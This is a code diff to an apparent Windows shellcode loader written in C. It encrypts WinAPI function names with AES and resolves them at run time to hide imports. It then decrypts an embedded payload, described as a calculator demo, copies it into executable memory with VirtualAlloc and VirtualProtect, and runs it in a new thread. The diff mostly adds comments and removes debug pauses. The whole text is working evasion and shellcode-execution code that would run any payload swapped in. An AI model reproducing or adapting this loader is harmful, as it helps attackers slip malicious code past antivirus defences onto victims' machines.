@@ -18,8 +18,9 @@ https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdec
 
 1) create pointers to WINAPI function calls
 2) encrypt function strings
-3) getprocaddress and getmodulehandle to get addresses of functions
-4) decrypt on run
+3) null terminate end of decrypted strings as needed
+4) getprocaddress and getmodulehandle to get addresses of functions
+5) run with new function pointers decrypted
 
 
 
@@ -127,6 +128,11 @@ BOOL vp;
 PDWORD lpflOldProtect = 0;
 HANDLE new_thread;
 
+//decrypt 'kern32 dll' needed for getprocaddress/getmodulehanle. add nullbyte at end because padding...
+AESDecrypt(kern32, sizeof(kern32), key, sizeof(key));
+kern32[12] = '\0';
+
+// create new pointer to VA via WINAPI
 LPVOID (WINAPI * pVirtualAlloc)(
   LPVOID lpAddress,
   SIZE_T dwSize,
@@ -134,18 +140,18 @@ LPVOID (WINAPI * pVirtualAlloc)(
   DWORD  flProtect
 );
 
+// encrypted 'va' string using python script above
 unsigned char VirtualAllocEnc[] = { 0xae, 0x9a, 0x7a, 0x52, 0x7c, 0xa6, 0xa9, 0x54, 0x86, 0x2a, 0xf, 0x97, 0xca, 0xff, 0xc3, 0x83 };
 
 
-AESDecrypt(kern32, sizeof(kern32), key, sizeof(key));
-kern32[12] = '\0';
 
 
+// decrypt string and remember to null term afterward to prevent encrypted junk from being sent to gpa/gmh (encrypting padding)...
 AESDecrypt(VirtualAllocEnc, sizeof(VirtualAllocEnc), key, sizeof(key));
 VirtualAllocEnc[12] = '\0';
 
 
-
+// get the address of the new pointer function
 pVirtualAlloc = GetProcAddress(GetModuleHandle(kern32), VirtualAllocEnc);
 if (!pVirtualAlloc){
   printf("\nerror getting VA proc address\n");
@@ -155,7 +161,7 @@ if (!pVirtualAlloc){
 
 
 
-
+// repeat steps done for VA func
 BOOL (WINAPI * pVirtualProtect)(
   LPVOID lpAddress,
   SIZE_T dwSize,
@@ -210,7 +216,7 @@ if (!pWaitForSingleObject){
   printf("\ngot WFSO proc address\n");
 }
 
-
+// print size of butter for sanity check
 printf("\nsize of payload is: %d\n", buf_length);
 
 
@@ -223,19 +229,14 @@ if (exec_payload != NULL) {
     exit(-1);
 };
 
-printf("%-20s : 0x%-016p\n", "payload addr", (void *)buf);
-printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_payload);
-
-printf("\nDebug Breakpoint 1! Pre Decrypt\n");
-getchar();
-
+//decrypt calc payload
 AESDecrypt((char *) buf, buf_length, (char *)key, sizeof(key));
 
-
+// move the decryptec calc payload into the VA address space
 RtlMoveMemory(exec_payload,buf,buf_length);
 printf("\nMem Moved...\n");
 
-
+// change perms on VA addy space
 vp = pVirtualProtect(exec_payload, buf_length, PAGE_EXECUTE_READ, &lpflOldProtect);
 
 if (vp == 0){
@@ -246,9 +247,7 @@ if (vp == 0){
 
 
 
-printf("\nDebug Breakpoint 2! Post Decrypt\n");
-getchar();    
-
+// create thread and run
     new_thread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_payload, 0,0,0);
     if (new_thread == NULL){
         printf("\nCT failed :/ \n");
